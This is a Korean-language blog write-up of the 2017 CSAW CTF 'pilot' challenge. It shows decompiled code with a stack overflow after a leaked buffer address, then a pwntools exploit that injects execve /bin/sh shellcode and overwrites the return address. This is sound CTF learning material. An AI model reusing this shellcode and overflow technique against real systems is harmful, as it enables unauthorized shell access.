---
title: "2017 CSAW CTF pilot"
date: 2019-12-30
tags: [Csaw]
categories: [Csaw]
---

c++ 바이너리인데 NX가 disable되어 있다. 그냥 간단한 RTS 문제다. 

```c++
signed __int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v8; // rax
  __int64 v9; // rax
  __int64 v10; // rax
  __int64 v11; // rax
  __int64 v12; // rax
  char buf; // [rsp+0h] [rbp-20h]

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  v3 = std::operator<<<std::char_traits<char>>(&std::cout, "[*]Welcome DropShip Pilot...");
  std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
  v4 = std::operator<<<std::char_traits<char>>(&std::cout, "[*]I am your assitant A.I....");
  std::ostream::operator<<(v4, &std::endl<char,std::char_traits<char>>);
  v5 = std::operator<<<std::char_traits<char>>(&std::cout, "[*]I will be guiding you through the tutorial....");
  std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
  v6 = std::operator<<<std::char_traits<char>>(
         &std::cout,
         "[*]As a first step, lets learn how to land at the designated location....");
  std::ostream::operator<<(v6, &std::endl<char,std::char_traits<char>>);
  v7 = std::operator<<<std::char_traits<char>>(
         &std::cout,
         "[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...");
  std::ostream::operator<<(v7, &std::endl<char,std::char_traits<char>>);
  v8 = std::operator<<<std::char_traits<char>>(&std::cout, "[*]Good Luck Pilot!....");
  std::ostream::operator<<(v8, &std::endl<char,std::char_traits<char>>);
  v9 = std::operator<<<std::char_traits<char>>(&std::cout, "[*]Location:");
  v10 = std::ostream::operator<<(v9, &buf);
  std::ostream::operator<<(v10, &std::endl<char,std::char_traits<char>>);
  std::operator<<<std::char_traits<char>>(&std::cout, "[*]Command:");
  if ( read(0, &buf, 64uLL) > 4 )
    return 0LL;
  v11 = std::operator<<<std::char_traits<char>>(&std::cout, "[*]There are no commands....");
  std::ostream::operator<<(v11, &std::endl<char,std::char_traits<char>>);
  v12 = std::operator<<<std::char_traits<char>>(&std::cout, "[*]Mission Failed....");
  std::ostream::operator<<(v12, &std::endl<char,std::char_traits<char>>);
  return 0xFFFFFFFFLL;
}
```

자세히 보자면 그냥 buf 위치를 준다. 그리고 뒤에서 buf에 read를 buf 크기 넘치게 입력받는데 여기에 shellcode를 넣고 버퍼 값을 넘치게 넣어서 ret을 buf로 바꾸면 쉘 코드가 실행되면서 쉘을 딸 수 있다.

```c++
v9 = std::operator<<<std::char_traits<char>>(&std::cout, "[*]Location:");
v10 = std::ostream::operator<<(v9, &buf);
```

> exploit.py

```python
from pwn import *

context.arch = 'amd64'
e = ELF('./pilot')
p = process('./pilot')
shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
# shellcode = "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

p.recvuntil('[*]Location:')
buf = int(p.recvline(),16)
log.info('buf : ' + hex(buf))
payload = shellcode + '\x90' * ((0x20+0x8)-len(shellcode))
payload += p64(buf)

p.sendlineafter('[*]Command:',payload)

p.interactive()
```

